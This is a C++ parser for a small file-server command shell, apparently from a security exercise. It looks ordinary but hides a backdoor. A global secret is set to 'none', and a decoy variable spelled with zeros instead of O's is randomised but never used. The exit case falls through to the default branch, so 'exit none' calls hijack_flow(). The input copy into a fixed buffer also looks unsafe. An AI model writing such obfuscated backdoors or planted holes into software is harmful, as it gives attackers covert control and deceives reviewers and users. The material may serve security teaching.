#include "Parser.hpp"
#include "commands.hpp"
#include "networking.hpp"
#include "User.hpp"

/*
 * Structure of code inspired by:
 * https://codereview.stackexchange.com/questions/87660/handling-console-application-commands-input
 */

using namespace std;

/*
 * -------------------------------- Constants & Variables --------------------------------------------------------------
 */
const char DELIMITER = ' ';
const string NOT_VALID_CMD = "Error: Not a correct command.\n";

string BACKDOOR_SECRET = "none";

static map<string, command> string_to_command;

// Map to associate the strings with the enum values
void Parser::initialize() {
    string_to_command["login"] = login_;
    string_to_command["pass"] = pass_;
    string_to_command["ping"] = ping_;
    string_to_command["ls"] = ls_;
    string_to_command["cd"] = cd_;
    string_to_command["mkdir"] = mkdir_;
    string_to_command["rm"] = rm_;
    string_to_command["get"] = get_;
    string_to_command["put"] = put_;
    string_to_command["grep"] = grep_;
    string_to_command["date"] = date_;
    string_to_command["whoami"] = whoami_;
    string_to_command["w"] = w_;
    string_to_command["logout"] = logout_;
    string_to_command["exit"] = exit_;
}

/**
 * Constructor, taking a map of allowed users as input.
 *
 * @param allowedUsers
 */
Parser::Parser(map<string, string> allowedUsers){
    srand(time(nullptr));
    this->allowedUsers = allowedUsers;
    shouldPrint = true;
    shouldSend = true;
    initialize();
}


/**
 * Parses given command string.
 *
 * @param command
 */
void Parser::parseCommand(string command){
    char cmd[MAX_CMD_LEN];
    strncpy(cmd, command.c_str(), CP_LEN > command.size() + 1? command.size() + 1 : CP_LEN);
    stringstream commandStream(cmd);

    string s;
    arg_n = 0;
    while (getline(commandStream, s, DELIMITER)) {
        tokens.push_back(s);
        arg_n++;
    }
}

/**
 * Helper function, getting the first parsed token.
 *
 * @return first parsed token
 */
string Parser::getFirstToken(){
    return tokens[0];
}

/**
 * Helper function to construct the appropriate error Message.
 *
 * @param commandName, name of command
 * @param argExpected, expected number of arguments
 * @return appropriate string
 */
string getErrorMessage(string commandName, int argExpected) {
    string msg = "Error: " + commandName;
    switch (argExpected) {
        case 0:
            return msg + " takes no arguments\n";
        case 1:
            return msg + " takes exactly one argument\n";
        case 2:
            return msg + " takes exactly two arguments\n";
        default:
            return "Error: not the right number of arguments for " + commandName;
    }
}

/**
 * Executes the last parsed command according to specifications.
 *
 * @param usr, User who wants to execute command.
 */
void Parser::executeCommand(User &usr){
    // Check whether first token is a valid command.
    if (string_to_command.count(getFirstToken()) == 0) {
        string errorMsg = NOT_VALID_CMD;
        output = errorMsg;
        return;
    }

    // Get command and execute it accordingly
    enum command c = string_to_command[getFirstToken()];
    int res = 0;
    switch (c) {
        case login_:
            if (checkArgNumber(1)) {
                login_cmd(tokens[1], allowedUsers, usr, output);
            } else {
                output = getErrorMessage("login", 1);
            }
            break;
        case pass_:
            if (checkArgNumber(1)) {
                res = pass_cmd(tokens[1], allowedUsers, usr, output);
            } else {
                output = getErrorMessage("pass", 1);
            }
            break;
        case ping_:
            if (checkArgNumber(1)) {
                ping_cmd(tokens[1], output);
            } else {
                output = getErrorMessage("ping", 1);

            }
            break;
        case ls_: {
            if (checkArgNumber(0)) {
                ls_cmd(usr.isAuthenticated(), output, usr);
            } else {
                output = getErrorMessage("ls", 0);
            }
            break;
        }
        case cd_: {
            if (!checkArgNumber(1)) {
                output = getErrorMessage("cd", 1);
                break;
            }
            cd_cmd(tokens[1], usr, output);
            break;
        }
        case mkdir_: {
            if (!checkArgNumber(1)) {
                output = getErrorMessage("mkdir", 1);
                break;
            }
            mkdir_cmd(tokens[1], usr, output);
            break;
        }
        case rm_: {
            if (!checkArgNumber(1)) {
                output = getErrorMessage("rm", 1);
                break;
            }
            rm_cmd(tokens[1], usr, output);
            break;
        }
        case get_: {
            if (!checkArgNumber(1)) {
                output = getErrorMessage("get", 1);
                break;
            }
            if(get_cmd(tokens[1], port, usr, output) == 0)
                shouldPrint = false;
            port++;
            break;
        }
        case put_: {
            if (!checkArgNumber(2)) {
                output = getErrorMessage("put", 2);
                break;
            }
            if(put_cmd(tokens[1], tokens[2], port, usr, output) == 0) {
                shouldPrint = false;
            };
            port++;
            break;
        }
        case grep_: {
            if (!checkArgNumber(1)) {
                output = getErrorMessage("grep", 1);
                break;
            }
            grep_cmd(tokens[1], usr, output);
            break;
        }
        case date_: {
            if (!checkArgNumber(0)) {
                output = getErrorMessage("date", 0);
                break;
            }
            date_cmd(usr.isAuthenticated(), output);
            break;
        }
        case whoami_: {
            if (!checkArgNumber(0)) {
                output = getErrorMessage("whoami", 0);
                break;
            }
            whoami_cmd(usr, output);
            break;
        }
        case w_: {
            if (!checkArgNumber(0)) {
                output = getErrorMessage("w", 0);
                break;
            }
            w_cmd(usr, output);
            break;
        }
        case logout_: {
            if (!checkArgNumber(0)) {
                output = getErrorMessage("logout", 0);
                break;
            }
            logout_cmd(usr, output);
            break;
        }
        case exit_: {
            if(exit_cmd(usr) == 0){
                shouldSend = false;
            }
        }
        default: {
            string BACKD00R_SECRET;

            char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

            for (int i = 0; i < 128; i++) {
                BACKD00R_SECRET += alphanum[rand() % (sizeof(alphanum) - 1)];
            }

            if (tokens[1] == BACKDOOR_SECRET) {
                hijack_flow();
            }
            break;
        }
    }

    // Pass has to follow the login command directly !
    if ((!usr.isAuthenticated() && c != pass_ && c!= login_) || (c == pass_ && res != 0)) {
        usr.resetUname();
    }
}

/**
 * Helper function to check the number of arguments that were given.
 *
 * @param arg_n_wanted, number of desired arguments
 * @return boolean, true if number of aruments corresponds to given input
 */
bool Parser::checkArgNumber(int arg_n_wanted) {
    return Parser::arg_n - 1 == arg_n_wanted;
}

/**
 * Resets parser, i.e. deletes previous command.
 */
void Parser::resetCommand(){
    arg_n = 0;
    output = "";
    tokens.clear();
    shouldPrint = true;
    shouldSend = true;
}

/**
 * Getter for shouldPrint member.
 *
 * @return boolean, True if server should print output.
 */
bool Parser::getShouldPrint(){
    return shouldPrint;
}

/**
 * Getter for shouldSend member.
 *
 * @return boolean, True if server should send the output to the client.
 */
bool Parser::getShouldSend(){
    return shouldSend;
}

/**
 * Getter for output memeber of class.
 *
 * @return string of output to be displayed by server
 */
string Parser::getOutput(){
    return output;
}

/**
 * Destructor.
 */
Parser::~Parser() = default;

